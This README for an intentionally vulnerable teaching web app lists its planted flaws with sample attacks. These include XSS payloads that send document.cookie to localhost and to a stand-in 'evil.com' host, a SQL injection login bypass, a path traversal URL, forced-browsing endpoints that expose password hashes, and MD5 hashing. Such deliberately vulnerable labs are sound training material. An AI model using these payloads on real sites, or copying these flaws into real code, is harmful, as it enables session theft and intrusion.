# DontDoThis

Simple web application with a bunch of serious security flaws.

It is intended as a teaching tool for security.

**WARNING** Only run in a safe environment as it will expose the entire filesystem over HTTP.

## Getting started

Run `npm ci` to install dependencies.

Run `npm start` for a dev server. Navigate to http://localhost:4200/.

Reset the database with `npm run sync`.


## Vulnerabilities

- About us form - script injection
    - <script>alert("Exploited")</script>
    - <script>fetch(`http://localhost:8000/${document.cookie}`)</script>
- Login form - SQL injection
    - " or id = 1 and "" = "
- Info page - Broken access control
    - GET /api/company/2
- User endpoint - Broken access control / forced browsing
    - http://localhost:4200/api/user/2 -> exposing password hash
- Cryptographic Failures -> MD5 hashing
- Path traversal
    - http://localhost:4200/api/message/company/../package.json
- Script injection
    - POST /api/message `<script>fetch(`http://evil.com/${document.cookie}`)</script>`
